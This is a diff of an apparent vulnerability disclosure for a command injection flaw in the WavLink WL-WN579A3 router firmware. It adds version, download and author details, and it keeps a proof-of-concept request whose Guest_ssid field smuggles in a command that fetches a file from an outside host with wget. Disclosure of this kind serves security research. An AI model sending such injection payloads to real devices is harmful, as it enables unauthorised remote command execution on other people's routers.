@@ -4,9 +4,13 @@ Vendor:WavLink
 
 Product:WL-WN579A3
 
+Version：V220323
+
+Download：https://docs.wavlink.xyz/Firmware_ch/?category=%E5%AE%A4%E5%86%85%E4%B8%AD%E7%BB%A7%E5%99%A8&model=WL-WN579A3
+
 Vulnerability: Command Injection
 
-Type:Remote Command Execution
+Author：Li Tengzheng
 
 
 
@@ -52,5 +56,9 @@ Content-Length: 68
 page=GuestWifi&guestEn=1&Guest_ssid=$(wget+192.168.6.1:6666/testpoc)
 ```
 
+
+## Result
+
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
